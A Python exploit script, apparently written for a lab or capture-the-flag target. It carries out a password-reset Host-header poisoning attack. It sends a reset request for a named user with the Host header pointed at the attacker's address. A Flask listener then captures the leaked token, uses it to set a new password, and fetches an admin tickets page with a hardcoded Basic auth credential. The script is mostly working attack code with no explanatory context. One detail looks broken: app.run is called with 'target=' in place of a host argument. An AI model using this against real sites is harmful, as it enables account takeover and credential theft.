#!/usr/bin/python3

####
####

from flask import *
import os,sys,re
import requests
import urllib
import threading
from base64 import b64encode
import time

###############
###############

target  =  ""
myaddy  =  ""

###############
###############

def FlaskThread():
    app.run(target='0.0.0.0', port=80)

def change_password(token):
    url = f'http://{target}/reset?token={token}'
    data = 'password=THINGS'
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Host":f"{target}", "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    print(f"Sending password change request to {url}")
    res = requests.post(url, data=data, headers=headers)
    if "Success" in res.text:
        print("Successfully changed password to: THINGS")
        login()
        return "Success"
        
    else:
        print("Something went wrong")
        print(res.text)
        return "failure"

def send_link():
    url = f"http://{target}/forgot?username=robert-dev-36712"
    headers = {"Host": f"{myaddy}"}
    res = requests.get(url, headers=headers)
    if "Password reset link has been sent to user inbox. Please use the link to reset your password" in res.text:
        print("Password link sent. Awaiting token...")

def login():
    url = f"http://{target}/admin_tickets"
    headers = {"Authorization": "Basic YWRtaW46am9uYXRoYW4=", "Content-Type": "application/x-www-form-urlencoded", "Host": f"{target}", "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"}
    res = requests.get(url, headers=headers)
    print(res.text)
app = Flask(__name__)
@app.route("/reset")
def reset():
    token = urllib.parse.quote(request.url.split("token=")[1])
    print("received token: " + token)
    time.sleep(2)
    changed = change_password(token)
    print(changed)
    if changed == "Success":
        print("Successfully changed password to: THINGS")
    else:
        print("trying......")
        time.sleep(2)
        changed = change_password(token)
        if changed == "Success":
            print("Success")
        else:
            print("retry......")
            time.sleep(2)
            send_link()

    return "Success"
@app.route("/test")
def test():
    return "Bye"

###############
###############

if __name__ == "__main__":
    x = threading.Thread(target=FlaskThread)
    x.start()
    send_link()    
    
####
####
    
    
